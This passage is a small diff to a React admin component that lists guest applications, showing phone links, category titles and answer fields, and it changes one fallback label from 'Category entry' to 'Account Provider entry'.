                 ? <a href={`tel:${application.phone.replace(/[^\d+]/g, '')}`} data-testid={`link-guest-phone-${application.id}`}>{application.phone}</a>
                 : <small>No phone provided</small>}</div>
                <div className="guest-admin-category"><strong>{configuredCategoryTitle(portalSettings.data, application.categoryId, application.categoryName)}</strong>
-                 <small>{copyText(portalSettings.data, categoryEntryScreenId(application.categoryId), 'title', 'Category entry')}</small>
+                 <small>{copyText(portalSettings.data, categoryEntryScreenId(application.categoryId), 'title', 'Account Provider entry')}</small>
                  <small>{application.reference}</small>
                  <small>{getCategoryEntryFields(application.answers, application.categoryId, portalSettings.data).map((field) => `${field.label}: ${field.value}`).join(' · ')}</small>
                </div>
